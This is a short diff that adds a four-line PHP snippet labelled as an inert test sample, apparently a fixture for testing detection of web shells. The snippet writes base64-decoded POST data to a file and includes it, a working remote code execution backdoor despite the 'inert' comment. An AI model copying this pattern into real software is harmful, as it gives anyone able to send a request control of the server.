@@ -1,0 +1,4 @@
+// INERT TEST SAMPLE
+file_put_contents($f, base64_decode($_POST['d']));
+include($f);
+
